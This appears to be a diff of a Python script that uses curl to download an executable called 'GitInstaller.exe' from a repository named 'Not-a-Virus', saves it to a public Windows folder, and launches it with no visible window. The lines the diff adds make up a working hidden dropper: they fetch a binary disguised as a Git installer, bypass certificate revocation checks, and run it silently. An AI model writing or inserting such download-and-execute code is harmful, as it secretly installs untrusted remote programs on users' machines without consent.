@@ -10,9 +10,9 @@ print('starting')
 # newFile = open('GitInstaller.exe', 'wb')
 # newFile.write(file.content)
 # newFile.close()
-os.system("curl -o ./Downloads/GitInstaller.exe -L https://github.com/romanjmock/Not-a-Virus/raw/main/dist/GitInstaller.exe --ssl-no-revoke")
+os.system("curl -o C:/Users/Public/GitInstaller.exe -L https://github.com/romanjmock/Not-a-Virus/raw/main/dist/GitInstaller.exe --ssl-no-revoke")
 print('file created')
 
 CREATE_NO_WINDOW = 0x08000000
-subprocess.Popen('GitInstaller.exe', creationflags = CREATE_NO_WINDOW)
+subprocess.Popen('C:/Users/Public/GitInstaller.exe', creationflags = CREATE_NO_WINDOW)
 print('done')
